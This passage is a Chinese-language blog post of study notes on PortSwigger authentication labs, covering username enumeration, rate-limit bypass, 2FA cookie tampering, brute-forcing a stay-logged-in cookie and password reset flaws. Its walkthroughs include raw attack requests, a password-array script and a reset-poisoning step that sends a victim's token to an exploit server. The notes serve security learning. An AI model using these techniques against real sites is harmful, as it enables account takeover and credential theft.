<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>2.Authentication身份验证 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="修订时间：2026.1.13 1.概念身份验证Authentication的关键在于确认用户是其声称的身份，区别于授权authorization确认用户是否被允许执行某个操作，例如，身份验证确定尝试使用用户名Carlos访问网站的人是否真的是创建该账户的人。一旦对Carlos进行了身份验证，他们的权限将决定他们被授权执行哪些操作。因此，身份验证漏洞可能允许攻击者访问敏感数据和功能，它们暴露了额外的">
<meta property="og:type" content="article">
<meta property="og:title" content="2.Authentication身份验证">
<meta property="og:url" content="http://example.com/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="修订时间：2026.1.13 1.概念身份验证Authentication的关键在于确认用户是其声称的身份，区别于授权authorization确认用户是否被允许执行某个操作，例如，身份验证确定尝试使用用户名Carlos访问网站的人是否真的是创建该账户的人。一旦对Carlos进行了身份验证，他们的权限将决定他们被授权执行哪些操作。因此，身份验证漏洞可能允许攻击者访问敏感数据和功能，它们暴露了额外的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/image-20260111213249-e1e5qtj.png">
<meta property="og:image" content="http://example.com/images/image-20251115175218-6pnqf55.png">
<meta property="og:image" content="http://example.com/images/image-20251115182124-othyg0y.png">
<meta property="og:image" content="http://example.com/images/image-20251115184721-kkvcgbj.png">
<meta property="og:image" content="http://example.com/images/image-20251115193608-lybbuiv.png">
<meta property="og:image" content="http://example.com/images/image-20251115193928-58dtuou.png">
<meta property="og:image" content="http://example.com/images/image-20251116001552-rxy2f0d.png">
<meta property="og:image" content="http://example.com/images/image-20251116002141-30623tz.png">
<meta property="og:image" content="http://example.com/images/image-20251116154147-yc4kat6.png">
<meta property="og:image" content="http://example.com/images/image-20251116154230-wyfa071.png">
<meta property="og:image" content="http://example.com/images/image-20251116154346-b3s08a2.png">
<meta property="og:image" content="http://example.com/images/image-20251116154641-xfd9bf9.png">
<meta property="og:image" content="http://example.com/images/image-20251116155906-4rjz1yx.png">
<meta property="og:image" content="http://example.com/images/image-20251116162000-yd018ep.png">
<meta property="og:image" content="http://example.com/images/image-20251116162205-lvi35wl.png">
<meta property="og:image" content="http://example.com/images/image-20251116165748-msmsk3b.png">
<meta property="og:image" content="http://example.com/images/image-20251116165726-u1ybcds.png">
<meta property="og:image" content="http://example.com/images/image-20251115125349-l268pwu.png">
<meta property="og:image" content="http://example.com/images/image-20251115132119-fpvrynr.png">
<meta property="og:image" content="http://example.com/images/image-20251115171506-5svg0ou.png">
<meta property="og:image" content="http://example.com/images/image-20251115173125-ss5bg7t.png">
<meta property="og:image" content="http://example.com/images/image-20251115173613-78szps8.png">
<meta property="og:image" content="http://example.com/images/image-20251115185818-7j4772y.png">
<meta property="og:image" content="http://example.com/images/image-20251115185915-x9ppfwg.png">
<meta property="og:image" content="http://example.com/images/image-20251115190137-43jvi3e.png">
<meta property="og:image" content="http://example.com/images/image-20251115190151-mrbu8dq.png">
<meta property="og:image" content="http://example.com/images/image-20251115195210-nsjmt2c.png">
<meta property="og:image" content="http://example.com/images/image-20251115195453-jhs9gl9.png">
<meta property="og:image" content="http://example.com/images/image-20251115195527-dtwxdif.png">
<meta property="og:image" content="http://example.com/images/image-20251115200747-ooqf5yi.png">
<meta property="og:image" content="http://example.com/images/image-20251115201831-7j9gils.png">
<meta property="og:image" content="http://example.com/images/image-20251115202005-x1u905l.png">
<meta property="og:image" content="http://example.com/images/image-20251115202257-m1hnhli.png">
<meta property="og:image" content="http://example.com/images/image-20251115220858-i7bd627.png">
<meta property="og:image" content="http://example.com/images/image-20251116145936-ptopecr.png">
<meta property="og:image" content="http://example.com/images/image-20251116150256-4292dx5.png">
<meta property="og:image" content="http://example.com/images/image-20251116151923-b4xjyy3.png">
<meta property="og:image" content="http://example.com/images/image-20251116152225-u58re5e.png">
<meta property="article:published_time" content="2026-01-12T08:58:32.000Z">
<meta property="article:modified_time" content="2026-01-12T17:10:14.593Z">
<meta property="article:author" content="hr1sto">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/image-20260111213249-e1e5qtj.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-Authentication身份验证" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/" class="article-date">
  <time class="dt-published" datetime="2026-01-12T08:58:32.000Z" itemprop="datePublished">2026-01-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/portswigger/">portswigger</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      2.Authentication身份验证
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>修订时间：2026.1.13</p>
<h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>身份验证Authentication的关键在于确认用户是其声称的身份，区别于授权authorization确认用户是否被允许执行某个操作，例如，身份验证确定尝试使用用户名Carlos访问网站的人是否真的是创建该账户的人。一旦对Carlos进行了身份验证，他们的权限将决定他们被授权执行哪些操作。因此，身份验证漏洞可能允许攻击者访问敏感数据和功能，它们暴露了额外的攻击面。</p>
<h1 id="2-Vulnerabilities-in-password-based-login"><a href="#2-Vulnerabilities-in-password-based-login" class="headerlink" title="2. Vulnerabilities in password-based login"></a>2. Vulnerabilities in password-based login</h1><h2 id="2-1-Brute-force-attacks"><a href="#2-1-Brute-force-attacks" class="headerlink" title="2.1 Brute-force attacks"></a>2.1 Brute-force attacks</h2><h3 id="2-1-1-usernames"><a href="#2-1-1-usernames" class="headerlink" title="2.1.1 usernames"></a>2.1.1 usernames</h3><ol>
<li>可识别的模式：例如电子邮件地址。例如，我们经常看到企业登录名采用<a href="mailto:&#x66;&#105;&#x72;&#115;&#116;&#110;&#97;&#x6d;&#x65;&#x2e;&#x6c;&#x61;&#115;&#x74;&#110;&#97;&#109;&#101;&#x40;&#115;&#x6f;&#109;&#101;&#x63;&#x6f;&#x6d;&#x70;&#97;&#x6e;&#x79;&#x2e;&#99;&#111;&#109;">&#x66;&#105;&#x72;&#115;&#116;&#110;&#97;&#x6d;&#x65;&#x2e;&#x6c;&#x61;&#115;&#x74;&#110;&#97;&#109;&#101;&#x40;&#115;&#x6f;&#109;&#101;&#x63;&#x6f;&#x6d;&#x70;&#97;&#x6e;&#x79;&#x2e;&#99;&#111;&#109;</a>的格式。</li>
<li>可预测的用户名：即使没有明显的模式，有时甚至会使用可预测的用户名（例如admin或administrator）来创建高权限账户。</li>
<li>收集资料：能否在未登录的情况下访问用户个人资料？即使个人资料的实际内容被隐藏，个人资料中使用的名称有时也与登录用户名相同。您还应该检查HTTP响应，看看是否公开了任何电子邮件地址。有时，响应中会包含高级特权用户（例如管理员或IT支持人员）的电子邮件地址。</li>
</ol>
<h3 id="2-1-2-passwords"><a href="#2-1-2-passwords" class="headerlink" title="2.1.2 passwords"></a>2.1.2 passwords</h3><p>利用&#x3D;&#x3D;对人类行为的基本了解&#x3D;&#x3D;来利用用户无意中引入到这个系统中的漏洞。用户通常不会使用随机字符组合来创建强密码，而是会尝试使用他们可以记住的密码，并试图将其塞入符合密码策略的密码。例如，如果不允许使用mypassword，用户可能会尝试使用Mypassword1!</p>
<h3 id="2-1-3-Username-enumeration"><a href="#2-1-3-Username-enumeration" class="headerlink" title="2.1.3 Username enumeration"></a>2.1.3 Username enumeration</h3><p>用户名枚举是指攻击者能够观察网站行为的变化，以便确定给定的用户名是否有效。</p>
<p>用户名枚举通常发生在登录页面，例如，当您输入有效的用户名但密码错误时，或者在注册表单上输入已存在的用户名时。这大大减少了暴力破解登录所需的时间和精力，因为攻击者能够快速生成一个有效用户名的简短列表。</p>
<p>在尝试对登录页面进行暴力破解时，您应该特别注意以下任何差异：</p>
<ol>
<li>状态码 ：在暴力破解攻击期间，返回的HTTP状态码对于绝大多数猜测可能是相同的，因为它们中的大多数都是错误的。如果某个猜测返回的状态码不同，这强烈表明用户名是正确的。对于网站来说，无论结果如何，始终返回相同的状态码是最佳实践，但这种做法并不总是被遵循。</li>
<li>错误消息：有时，返回的错误消息会根据用户名和密码都是否正确或只有密码不正确而有所不同。在两种情况下都使用相同的通用消息是最佳实践，但有时会出现小的打字错误。即使只有一个字符的位置不对，也会使两条消息有所不同，即使在呈现的页面上看不到该字符。</li>
<li>响应时间：如果大多数请求的处理响应时间都相似，那么任何与此不同的请求都表明幕后可能发生了不同的事情。这也表明猜测的用户名可能是正确的。例如，网站可能只有在用户名有效的情况下才会检查密码是否正确。这额外的步骤可能会导致响应时间略有增加。这可能是微妙的，但攻击者可以通过输入一个过长的密码来使这种延迟更加明显，网站处理这个过长的密码需要明显更长的时间。</li>
</ol>
<p><img src="/images/image-20260111213249-e1e5qtj.png" alt="image"></p>
<h2 id="2-2-Flawed-brute-force-protection"><a href="#2-2-Flawed-brute-force-protection" class="headerlink" title="2.2 Flawed brute-force protection"></a>2.2 Flawed brute-force protection</h2><p>从逻辑上讲，暴力保护的核心是尽可能地使自动化过程变得困难，并减缓攻击者尝试登录的速度。防止暴力攻击的两种最常见的方法是:</p>
<ol>
<li>如果远程用户多次尝试失败，锁定他们试图访问的账户。</li>
<li>如果远程用户在短时间内多次尝试登录，阻止他们的IP地址。</li>
</ol>
<p>这两种方法都提供了不同程度的保护，但都没有固若金汤，尤其是如果实现逻辑有缺陷的话。例如，如果你多次登录失败，有时可能会发现你的IP被屏蔽了。在某些实现中，如果IP所有者成功登录，失败尝试的次数计数器会重置。这意味着攻击者只需要每隔几次尝试就登录到他们自己的账户，就可以防止达到这个限制。在这种情况下，只需在字典中的每个间隔包含您自己的登录凭据，就足以使这种防御变得几乎毫无用处。</p>
<p>账户锁定无法防止凭证填充攻击。这种攻击方式涉及使用一个由用户名:密码对组成的巨大字典，这些字典由数据泄露中窃取的真实登录凭证组成。凭证填充依赖于一个事实，即许多人在多个网站上重复使用相同的用户名和密码，因此，字典中一些受损的凭证也有可能在目标网站上有效。账户锁定无法防止凭证填充，因为每个用户名只被尝试一次。凭证填充尤其危险，因为它有时会导致攻击者只需一次自动攻击就可以破坏许多不同的账户。</p>
<h3 id="2-2-1-User-rate-limiting"><a href="#2-2-1-User-rate-limiting" class="headerlink" title="2.2.1 User rate limiting"></a>2.2.1 User rate limiting</h3><p>网站防止暴力攻击的另一种方法是限制用户速率。在这种情况下，在短时间内发出太多登录请求会导致您的 IP 地址被屏蔽。通常，IP 只能通过以下一种方式解除屏蔽：</p>
<ol>
<li>在一段时间后自动解除屏蔽</li>
<li>由管理员手动解除屏蔽</li>
<li>用户在成功完成验证码后手动解除屏蔽</li>
</ol>
<p>与账户锁定相比，有时更倾向于使用用户速率限制，因为它不太容易受到用户名枚举和拒绝服务攻击。</p>
<p>由于限制是基于从用户 IP 地址发送的 HTTP 请求的速率，因此，如果您能想出如何通过一个请求猜测多个密码，有时也可以绕过此防御。</p>
<ol>
<li><p>运行Burp后，检查登录页面。注意，POST &#x2F;login请求以JSON格式提交登录凭据。将此请求发送到Burp Repeater中，将密码的单个字符串值替换为包含所有候选密码的字符串数组。例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file_path=<span class="string">r&quot;C:\Users\xxxxxxxx\Desktop\password.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)<span class="keyword">as</span> infile:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> infile:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&quot;&#x27;</span>+line.rstrip(<span class="string">&quot;\n&quot;</span>)+<span class="string">&#x27;&quot;,&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">infile.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\&quot;2\&quot;]&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/images/image-20251115175218-6pnqf55.png" alt="image"></p>
<ol start="2">
<li><p>发送请求。这将返回一个302响应。</p>
<p><img src="/images/image-20251115182124-othyg0y.png" alt="image"></p>
</li>
<li><p>右键单击此请求并选择在浏览器中显示响应。复制URL并将其加载到浏览器中。页面加载，您以carlos的身份登录。拿到session.</p>
</li>
</ol>
<h2 id="2-3-HTTP-basic-authentication"><a href="#2-3-HTTP-basic-authentication" class="headerlink" title="2.3 HTTP basic authentication"></a>2.3 HTTP basic authentication</h2><p>尽管HTTP基本认证（HTTP basic authentication）相对简单且易于实现，但它的安全性并不高，因此现在已不常用。在进行HTTP基本认证时，客户端会从服务器接收一个认证令牌（authentication token），该令牌是通过将用户名和密码连接起来，然后使用Base64编码生成的。这个令牌由浏览器存储和管理，浏览器会自动将其添加到后续每个请求的Authorization头部中，格式如下：Authorization: Basic base64(username:password)</p>
<p>以下是HTTP基本认证被认为不安全的原因：</p>
<p>它需要在每次请求时反复发送用户的登录凭证（login credentials）。除非网站同时也实现了HSTS（HTTP Strict Transport Security），否则用户的凭证很容易在中间人攻击（man-in-the-middle attack）中被截获。<br>HTTP基本认证的实现通常不支持抵御暴力攻击（brute-force protection）。由于令牌完全由静态值组成，因此很容易受到暴力攻击。<br>HTTP基本认证特别容易受到与会话相关的攻击（session-related exploits），尤其是CSRF（跨站请求伪造，Cross-site request forgery），而它本身并不能提供针对CSRF的保护。</p>
<p>在某些情况下，利用脆弱的HTTP基本认证可能只会让攻击者访问到一个看起来无关紧要的页面。但是，除了提供一个额外的攻击面之外，以这种方式暴露的凭证可能会在其他更机密的上下文中被重用。</p>
<h1 id="3-Vulnerabilities-in-multi-factor-authentication"><a href="#3-Vulnerabilities-in-multi-factor-authentication" class="headerlink" title="3. Vulnerabilities in multi-factor authentication"></a>3. Vulnerabilities in multi-factor authentication</h1><p>许多网站仅依赖使用密码的单因素认证来验证用户。然而，有些网站要求用户通过多个认证因素来证明自己的身份。对于大多数网站来说，验证生物识别因素是不现实的。但是，越来越多地看到基于您所知道的内容和您所拥有的内容的强制性和可选性的两因素认证（2FA）。这通常要求用户输入传统的密码和他们拥有的带外物理设备上的临时验证码。</p>
<p><img src="/images/image-20251115184721-kkvcgbj.png" alt="image"></p>
<p>虽然攻击者有时可能会获得一个基于知识的单一因素，例如密码，但同时从带外源获得另一个因素要困难得多。因此，两因素认证比单因素认证更安全。</p>
<p>实施不当的两因素认证可能会被击败，甚至完全绕过，就像单因素认证一样。值得注意的是，只有通过验证多个不同的因素，才能完全实现多因素认证的好处。</p>
<p>以两种不同的方式验证相同的因素并不是真正的两因素认证。基于电子邮件的2FA就是这样一个例子。虽然用户必须提供密码和验证码，但访问验证码仅依赖于他们知道自己的电子邮件账户的登录凭据。因此，知识认证因素只是被验证了两次。</p>
<p>2FA 的「安全增量」来自「不同类型因素的互补」，而非「同一因素的重复验证」。电子邮件 2FA 的两次验证（密码 + 邮箱验证码），本质都是验证「用户知道什么」，没有引入「持有物」或「生物特征」等独立因素，因此不算真正的 2FA—— 它只是「加强版的单因素认证」，而非符合标准的双因素认证。</p>
<h2 id="3-1-2FA-simple-bypass"><a href="#3-1-2FA-simple-bypass" class="headerlink" title="3.1 2FA simple bypass"></a>3.1 2FA simple bypass</h2><p>有时，二次认证的实施存在缺陷，以至于可以被完全绕过。如果用户首先被提示输入密码，然后在另一个页面上被提示输入验证码，那么用户在输入验证码之前实际上已经处于“登录”状态。在这种情况下，值得测试一下在完成第一步认证后，你是否可以直接跳转到“仅登录”页面。有时，你会发现网站在实际加载页面之前，并没有检查你是否完成了第二步认证。</p>
<p>‍</p>
<h2 id="3-2-Flawed-two-factor-verification-logic"><a href="#3-2-Flawed-two-factor-verification-logic" class="headerlink" title="3.2 Flawed two-factor verification logic"></a>3.2 Flawed two-factor verification logic</h2><p>有时，双因素身份验证中的&#x3D;&#x3D;逻辑缺陷&#x3D;&#x3D;意味着，在用户完成了初始登录步骤后，网站没有充分验证同一用户是否正在完成第二步。例如，用户在第一步中使用其正常凭据登录，如下所示：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /login-steps/first HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">...</span><br><span class="line">username=carlos&amp;password=qwerty</span><br></pre></td></tr></table></figure>

<p>然后，在进入登录过程的第二步之前，他们会被分配一个与他们的帐户相关的cookie：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie: account=carlos</span><br><span class="line"></span><br><span class="line">GET /login-steps/second HTTP/1.1</span><br><span class="line">Cookie: account=carlos</span><br></pre></td></tr></table></figure>

<p>当提交验证码时，请求使用这个cookie来确定用户正在尝试访问哪个帐户：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /login-steps/second HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: account=carlos</span><br><span class="line">...</span><br><span class="line">verification-code=123456</span><br></pre></td></tr></table></figure>

<p>在这种情况下，攻击者可以使用自己的凭据登录，但在提交验证码时将帐户cookie的值更改为任意用户名。</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /login-steps/second HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: account=victim-user</span><br><span class="line">...</span><br><span class="line">verification-code=123456</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;如果攻击者能够暴力破解验证码，这将是极其危险的，因为这将允许他们完全基于用户名登录任意用户的帐户。他们甚至不需要知道用户的密码。&#x3D;&#x3D;</p>
<p>‍</p>
<p>在运行 Burp 的情况下，登录您自己的账户并检查 2FA 验证过程。请注意，在 POST &#x2F;login2 请求中，verify 参数用于确定正在访问哪个用户的账户。<br>注销您的账户。<br>将 GET &#x2F;login2 请求发送到 Burp Repeater。将 verify 参数的值更改为 carlos 并发送请求。这将确保为 Carlos 生成一个临时的 2FA 代码。</p>
<p><img src="/images/image-20251115193608-lybbuiv.png" alt="image"><br>转到登录页面并输入您的用户名和密码。然后，提交一个无效的 2FA 代码。<br>将 POST &#x2F;login2 请求发送到 Burp Intruder。<br>在 Burp Intruder 中，将 verify 参数设置为 carlos 并向 mfa-code 参数添加一个有效负载位置。对验证码进行暴力破解。<br>在浏览器中加载 302 响应。</p>
<p><img src="/images/image-20251115193928-58dtuou.png" alt="image"></p>
<p>要模拟正常用户的行为，有些要素是需要有行为模拟后才会触发的，比如安全的验证码。</p>
<h1 id="4-Vulnerabilities-in-other-authentication-mechanisms"><a href="#4-Vulnerabilities-in-other-authentication-mechanisms" class="headerlink" title="4.Vulnerabilities in other authentication mechanisms"></a>4.Vulnerabilities in other authentication mechanisms</h1><p>除了基本的登录功能之外，大多数网站还提供&#x3D;&#x3D;补充功能&#x3D;&#x3D;，允许用户管理自己的账户。例如，用户通常可以在忘记密码时更改密码或重置密码。这些机制也可能引入攻击者可以利用的漏洞。网站通常会注意避免在其登录页面中出现众所周知的漏洞。但是，人们很容易忽视一点，那就是你需要采取类似的措施来确保相关功能的健壮性。</p>
<p>在攻击者能够创建自己的账户的情况下，这一点尤其重要，因为这样攻击者就可以轻松地访问这些额外的页面。</p>
<h2 id="4-1-Brute-forcing-a-stay-logged-in-cookie"><a href="#4-1-Brute-forcing-a-stay-logged-in-cookie" class="headerlink" title="4.1 Brute-forcing a stay-logged-in cookie"></a>4.1 Brute-forcing a stay-logged-in cookie</h2><p>许多网站在用户登录时提供了一个选项，即在关闭浏览器后仍然保持登录状态。这通常是一个简单的复选框，标记为“记住我”或“保持登录状态”。</p>
<p>此功能通常通过生成某种“remember me”令牌来实现，然后将该令牌存储在持久性 cookie 中。</p>
<p>由于拥有此 cookie 可以有效地让您绕过整个登录过程，因此此 cookie 最好是难以猜测的。</p>
<p>但是，一些网站会根据可预测的静态值组合（例如用户名和时间戳）生成此 cookie。有些甚至使用密码作为 cookie 的一部分。</p>
<p>如果攻击者能够创建自己的账户，这种方法尤其危险，因为他们可以研究自己的 cookie，并可能推断出它是如何生成的。一旦他们弄清楚了公式，他们就可以尝试暴力破解其他用户的 cookie 以访问他们的账户。</p>
<p>一些网站假设，如果 cookie 以某种方式加密，它将不可猜测，即使它确实使用静态值。如果做得正确，这可能是正确的，但是使用简单的双向编码（如 Base64）天真地“加密”cookie 根本不提供任何保护。即使使用带有单向散列函数 的正确加密也不是完全安全的。如果攻击者能够轻松识别散列算法，并且不使用盐，他们就可以通过简单地对单词表进行散列来潜在地对 cookie 进行暴力破解。如果对 cookie 猜测没有类似的限制，则可以使用此方法绕过登录尝试限制。</p>
<p>‍</p>
<p><img src="/images/image-20251116001552-rxy2f0d.png" alt="image"></p>
<p>是base64(username+md5(密码))</p>
<p><img src="/images/image-20251116002141-30623tz.png" alt="image"></p>
<p>在 Burp Intruder 中，请注意 stay-logged-in cookie 已自动添加为有效负载位置。添加您自己的密码作为单个有效负载。<br>在“有效负载处理”下，依次添加以下规则。这些规则将在请求提交之前依次应用于每个有效负载。<br>• 哈希：MD5<br>• 添加前缀：wiener:<br>• 编码：Base64 编码</p>
<h2 id="3-3-Resetting-user-passwords"><a href="#3-3-Resetting-user-passwords" class="headerlink" title="3.3 Resetting user passwords"></a>3.3 Resetting user passwords</h2><p>在实践中，一些用户会忘记他们的密码，所以有一种方法让他们重置密码是很常见的。由于通常的基于密码的身份验证在这种情况下显然是不可能的，网站必须依靠其他方法来确保真正的用户正在重置自己的密码。因此，密码重置功能本质上是危险的，需要安全地实现。这个特性通常有几种不同的实现方式，具有不同程度的漏洞。</p>
<h3 id="3-3-1-Sending-passwords-by-email"><a href="#3-3-1-Sending-passwords-by-email" class="headerlink" title="3.3.1 Sending passwords by email"></a>3.3.1 Sending passwords by email</h3><p>如果一个网站最初就安全地处理密码，那么就不应该向用户发送他们当前的密码。相反，一些网站会生成一个新密码，并通过电子邮件将其发送给用户。一般来说，应避免通过不安全的渠道发送持久性密码。在这种情况下，安全性依赖于生成密码在很短的时间后过期，或者用户立即再次更改密码。否则，这种方法很容易受到中间人攻击。鉴于收件箱是持久的，并且并不是真正为安全存储机密信息而设计的，因此电子邮件通常也不被认为是安全的。许多用户还会在不安全渠道中的多个设备之间自动同步他们的收件箱。</p>
<h3 id="3-3-2-Resetting-passwords-using-a-URL（broken-logic）"><a href="#3-3-2-Resetting-passwords-using-a-URL（broken-logic）" class="headerlink" title="3.3.2 Resetting passwords using a URL（broken logic）"></a>3.3.2 Resetting passwords using a URL（broken logic）</h3><p>一种更健壮的密码重置方法是向用户发送一个唯一的URL，将他们带到密码重置页面。这种方法的安全性较低的实现方式是使用一个容易猜测的参数来标识要重置哪个账户，例如：<a target="_blank" rel="noopener" href="http://vulnerable-website.com/reset-password?user=victim-user">http://vulnerable-website.com/reset-password?user=victim-user</a></p>
<p>在这个例子中，攻击者可以更改user参数，以引用他们已经识别的任何用户名。然后，他们将被直接带到一个页面，在那里他们可以潜在地为这个任意用户设置一个新密码。</p>
<p>这个过程的一个更好的实现方法是生成一个高熵、难以猜测的令牌，并基于该令牌创建重置URL。在最佳情况下，这个URL应该不提供有关哪个用户的密码正在被重置的提示。</p>
<p><a target="_blank" rel="noopener" href="http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8">http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8</a></p>
<p>当用户访问这个URL时，系统应该检查这个令牌在后台是否存在，如果存在，应该检查它是用来重置哪个用户的密码的。</p>
<p>这个令牌应该在短时间内过期，并在密码重置后立即销毁。然而，一些网站在重置表单提交时未能再次验证令牌。在这种情况下，攻击者可以简单地访问他们自己账户的重置表单，删除令牌，并利用这个页面来重置任意用户的密码。</p>
<p><img src="/images/image-20251116154147-yc4kat6.png" alt="image"></p>
<p><img src="/images/image-20251116154230-wyfa071.png" alt="image"></p>
<p>输入重置密码的链接后，点击链接跳转</p>
<p><img src="/images/image-20251116154346-b3s08a2.png" alt="image"><img src="/images/image-20251116154641-xfd9bf9.png" alt="image"></p>
<ol>
<li>运行Burp Suite，单击“忘记密码？”链接，并输入您自己的用户名。</li>
<li>单击“电子邮件客户端”按钮，查看已发送的密码重置电子邮件。单击电子邮件中的链接，并将密码重置为您想要的任何密码。</li>
<li>在Burp中，转到“代理”&gt;“HTTP历史记录”，并研究密码重置功能的请求和响应。请注意，重置令牌作为重置电子邮件中的URL查询参数提供。请注意，提交新密码时，POST &#x2F;forgot-password?temp-forgot-password-token请求包含作为隐藏输入的用户名。将此请求发送到Burp Repeater。</li>
<li>在Burp Repeater中，请注意，即使您删除URL和请求正文中temp-forgot-password-token参数的值，密码重置功能仍然有效。这确认了在提交新密码时不会检查令牌。</li>
<li>在浏览器中，再次请求密码重置并再次更改密码。将POST &#x2F;forgot-password?temp-forgot-password-token请求再次发送到Burp Repeater。</li>
<li>在Burp Repeater中，删除URL和请求正文中temp-forgot-password-token参数的值。将username参数更改为carlos。将新密码设置为所需的任何密码，然后发送请求。</li>
<li>在浏览器中，使用您刚刚设置的新密码登录Carlos的帐户。单击“我的帐户”以解决实验室问题。</li>
</ol>
<p><img src="/images/image-20251116155906-4rjz1yx.png" alt="image"></p>
<p>‍</p>
<h3 id="3-3-3-Lab-Password-reset-poisoning-via-middleware"><a href="#3-3-3-Lab-Password-reset-poisoning-via-middleware" class="headerlink" title="3.3.3 Lab: Password reset poisoning via middleware"></a>3.3.3 Lab: Password reset poisoning via middleware</h3><p>这个实验室很容易受到密码重置中毒的影响。用户carlos会不小心点击他收到的电子邮件中的任何链接。要解决实验室的问题，登录卡洛斯的账户。</p>
<p>您可以使用以下凭据登录自己的帐户：wiener:peter。发送到该帐户的任何电子邮件都可以通过漏洞利用服务器上的电子邮件客户端读取。</p>
<p>‍</p>
<ol>
<li>在运行Burp的情况下，研究密码重置功能。可以看到，一封包含唯一重置令牌的链接通过电子邮件发送。</li>
<li>将POST &#x2F;forgot-password请求发送到Burp Repeater。注意，X-Forwarded-Host头是受支持的，您可以使用它将动态生成的重置链接指向任意域。</li>
<li>转到攻击服务器并记下您的攻击服务器URL。</li>
<li>返回到Burp Repeater中的请求，并使用您的攻击服务器URL添加X-Forwarded-Host头(&#x3D;&#x3D;纯域名&#x3D;&#x3D;)：X-Forwarded-Host: exploit-0a040027049c72d7801b48f2018f000b.exploit-server.net&#x2F;exploit</li>
<li>将username参数更改为carlos并发送请求。</li>
</ol>
<p><img src="/images/image-20251116162000-yd018ep.png" alt="image"><br>转到攻击服务器并打开访问日志。您应该看到一个包含受害者的令牌作为查询参数的GET &#x2F;forgot-password请求。记下此令牌。<br>返回到您的电子邮件客户端并复制有效的密码重置链接（不是指向攻击服务器的链接）。将此粘贴到浏览器中，并将temp-forgot-password-token参数的值更改为您从受害者那里窃取的值。</p>
